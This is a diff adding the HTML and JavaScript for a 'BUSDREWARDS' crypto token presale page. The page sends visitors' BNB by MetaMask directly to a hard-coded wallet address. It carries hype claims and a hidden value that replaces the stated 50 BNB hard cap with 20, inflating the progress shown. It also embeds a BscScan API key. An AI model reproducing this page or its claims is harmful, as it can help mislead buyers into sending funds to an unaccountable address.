@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>BUSDREWARDS</title>
+    <link rel="shortcut icon" type="image/x-icon" href="log.png">
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="bootstrap.min.css" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Chewy&amp;display=swap" rel="stylesheet">
+</head>
+
+
+
+<body>
+    <div class="wrapper">
+        <!-- Sidebar  -->
+
+
+        <!-- Page Content  -->
+        <div id="content">
+
+
+
+         
+            <div id="app">
+                <div class="head">
+
+                  
+                       
+                    <img src="logobusd.png" style="
+                    width: 100%;
+                    max-width: 197px;
+                    height: auto !important;
+                    min-height: inherit;
+                ">
+                    
+                   
+                           
+                   
+                    
+              
+                                <button class="btn"  onclick="onPageLoad()"><span id="con">CONNECT</span></button> 
+                     
+                     
+                               
+
+                     
+
+                    </div>
+                </div>
+                <div class="container">
+            
+                    <div class="row">
+                        <div class="col-md-3">
+                            <div class="box1">
+                                <div class="info">
+                                    <h3>ACCOUNT</h3>
+                                    <p> Your Wallet</p>
+                                    <p id="myacc">x00000000..</p>
+                                   <p>BALANCE<span id="mybalance">0.0BNB</span></p>
+                                   
+                                </div>
+                                
+                            </div>
+
+                        </div>
+
+
+                        <div class="col-md-6">
+                            <div class="box1">
+                                <img src="rewards.jpg" style="
+                                width: 100%;
+                            ">
+                                <div class="title-area">
+                                    <img src="logobusd.png" style="
+    width: 300px;
+">
+                                   
+                                </div>
+                                <div id="desc">
+                                    BUSD Rewards Project is the only token that has a high percentage BUSD rewards token from every transaction of the investors and it will be automatically goes to the Holders. <div class="contr">
+                                    <p>Presale Address : <span id="preddress">0x18d11c6631FCB29d53c2A9F3dA949502CFdCF27b</span></a></p>
+                                    </div>
+
+
+                                <div class="timer pt-4">
+                                
+
+                                    <div id="countdown">
+                                        <h4>Presale end at:</h4>
+                                        <ul>
+                                            <li><span id="days"></span>day</li>
+                                            <li><span id="hours"></span>Hours</li>
+                                            <li><span id="minutes"></span>Minutes</li>
+                                            <li><span id="seconds"></span>Seconds</li>
+                                        </ul>
+                                    </div>
+
+                                </div>
+
+
+                                <div id="contents">
+                                    <div class="button-area">
+                                        <div class="balance-container">
+                                            <h3 id="headline"> </h3>
+                                            <div class="dbl">
+                                                <span id="devbl">0.0</span> 
+                                                <span>/</span>
+                                                <span id="am">50</span>
+                                                <span>BNB RAISED</span>
+
+                                                <input type="hidden" id="maxi" value="20"></input>
+                                                <P id="GFG">
+                                                </p>
+
+                                            </div>
+                                        </div>
+                                        <script>
+                                            
+     fetch('https://api.bscscan.com/api?module=account&action=balance&address=0x18d11c6631FCB29d53c2A9F3dA949502CFdCF27b&tag=latest&apikey=UNB56UTPSVK6BXCH74XEA1J272PPSUF9T7')
+            .then(res => {
+                return res.json();
+            })
+
+        .then(json => {
+
+            const amm = json.result;
+              // json.result
+
+          
+            ammbal =  Web3.utils.fromWei(amm, 'ether')   ;
+            console.log(amm);
+            // web3.utils.fromWei(amm, "ether")
+         
+
+           
+
+
+
+            document.getElementById("devbl").innerHTML = ammbal;
+
+
+            var amounts = ammbal;
+
+            var max = document.getElementById("maxi").value;
+
+            document.getElementById("am").innerHTML = max;
+
+            var g = document.createElement("progress");
+
+            // Set the value of progress element
+            g.setAttribute("value", amounts);
+
+            // Set the maximum value of progress element
+            g.setAttribute("max", max);
+
+            // Get the value of progress element
+            document.getElementById("GFG").appendChild(g);
+
+
+        })
+                                        </script>
+
+
+                                        <div class="input-container">
+                                            <img class="bnbi" src="bnb.svg" />
+                                            <input id="buyinput" class="input" value="0.1" placeholder="0.1"></input>
+                                        </div>
+                                        <p>Enter amount of BNB you want to contribute!</p>
+
+                                        <button class="btn" id="airbtn" onclick="buystt()"> <img src="buy.png" /><span>BUY TOKEN</span></button>
+
+                                    </div>
+                                    <div class="button-area">
+                                        <div class="balance-container">
+                                            <span id="locked-money">-</span>
+                                        </div>
+                                  
+                                    </div>
+
+                                </div>
+                                <div class="contribute">
+                                    <br>
+
+                                    <div class="row">
+
+                                        <div class="col-md-6">
+                                            <div class="box1">
+                                               TWITTER
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="box1">
+                                                TELEGRAM
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+
+
+
+
+                                </div>
+
+                            </div>
+                        </div>
+                        </div>
+
+                        <div class="col-md-3">
+                            <div class="box1">
+                                <h3>PRESALE DETAILS</h3>
+                                <div class="details">
+                                    <table>
+                                        <tbody>
+
+                                        
+                                        
+                                            <tr>
+                                                <td>Supply</td>
+                                                <td>10M</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Token Decimal</td>
+                                                <td>18</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Soft Cap</td>
+                                                <td>25 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Hard Cap</td>
+                                                <td>50 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Presale</td>
+                                                <td>6.5M</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Minimum Contribution </td>
+                                                <td>0.01 BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Maximum Contribution </td>
+                                                <td>4 BNB</td>
+                                            </tr>
+
+                                            <tr>
+                                                <td>Listing Rate</td>
+                                                <td>130.000 per 1BNB</td>
+                                            </tr>
+                                            <tr>
+                                                <td>Liquidity locked</td>
+                                                <td>80%</td>
+                                            </tr>
+
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <h4 style="
+                    text-align: center;
+                    color: #d85cee;
+                ">BUSDREWARDS DAPP WEB3.0 BETA V0.01</h4>
+                </div>
+
+
+
+                <script src="web3.js"></script>
+                <script>
+                    let addr;
+                    const presaleadd = "0x18d11c6631FCB29d53c2A9F3dA949502CFdCF27b";
+
+
+                    const loadweb3 = async() => {
+                        try {
+                            web3 = new web3js.myweb3(window.ethereum);
+
+                            
+
+                            let a = await ethereum.enable();
+                            addr = web3.utils.toChecksumAddress(a[0]);
+
+                            return (addr);
+
+                        } catch (error) {
+                            if (error.code === 4001) {
+                                console.log('Please connect to MetaMask.')
+                            } else {
+                                console.error(error)
+                            }
+                        }
+
+                    };
+
+
+
+
+
+                    const buystt = async() => {
+
+                        await loadweb3();
+
+                        if (addr == undefined) {
+                            alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
+                        }
+
+                        let ethval = document.getElementById("buyinput").value;
+                        ethval = Number(ethval) * 1e18;
+
+                        web3.eth.sendTransaction({
+                            from: addr,
+                            to: presaleadd,
+                            value: ethval,
+                            gasLimit: 21000,
+                            gasPrice: 20000000000
+                        }, (err, res) => {
+                            if (!err) console.log(res);
+                            else console.log(err);
+                        });
+
+                    }
+                </script> 
+
+
+                <script src="script.js"></script>
+                <script src="wesb3.min.js"></script>
+
+
+                <script>
+                    (function() {
+                        const second = 1000,
+                            minute = second * 60,
+                            hour = minute * 60,
+                            day = hour * 24;
+
+                        let launch = "july 4, 2022 14:00:00",
+                            countDown = new Date(launch).getTime(),
+                            x = setInterval(function() {
+
+                                let now = new Date().getTime(),
+                                    distance = countDown - now;
+
+                                document.getElementById("days").innerText = Math.floor(distance / (day)),
+                                    document.getElementById("hours").innerText = Math.floor((distance % (day)) / (hour)),
+                                    document.getElementById("minutes").innerText = Math.floor((distance % (hour)) / (minute)),
+                                    document.getElementById("seconds").innerText = Math.floor((distance % (minute)) / second);
+
+                                //do something later when date is reached
+                                if (distance < 0) {
+                                    let headline = document.getElementById("headline"),
+                                        countdown = document.getElementById("countdown"),
+                                        contents = document.getElementById("contents");
+
+                                    headline.innerText = " PRESALE IS LIVE ";
+                                    countdown.style.display = "none";
+                                    contents.style.display = "block";
+
+
+
+
+                                    clearInterval(x);
+                                }
+                                //seconds
+                            }, 0)
+                    }());
+                </script>
+
+
+
+            </div>
+        </div>
+
+
+
+
+</body>
+
+</html>
